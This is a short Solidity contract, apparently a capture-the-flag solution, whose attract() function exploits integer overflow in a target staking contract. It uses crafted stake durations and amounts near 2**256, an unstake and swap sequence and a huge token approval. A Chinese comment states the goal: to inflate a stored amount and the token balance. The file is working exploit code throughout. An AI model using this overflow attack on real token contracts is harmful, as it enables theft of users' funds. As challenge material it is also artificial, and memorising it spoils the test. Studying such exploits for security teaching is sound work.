// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "./2.sol";
// 1.结构体amount增加.2.token余额增加
contract Attract{
    check public  check1;
    ZT public zt;
    uint256 maxnum = 2**256 - 1;
    uint256 decimal = 10**18;
    constructor(check add) public {
        check1 = add;
        zt = check1.token();
    }
    function getOvernum() public view returns(uint256){
        return 2**256 - 1 - block.number + 1;
    }
    function getOverAmount() public view returns(uint256){
        return  (maxnum/decimal) + 1;
    }
    function attract() public {
        check1.stake(0, getOvernum());
        check1.unstake();
        check1.swap(600000);
        zt.approve(address(check1), 1000000000000 ether);
        check1.stake(getOverAmount(),getOvernum());
        check1.isCompleted();
    }
}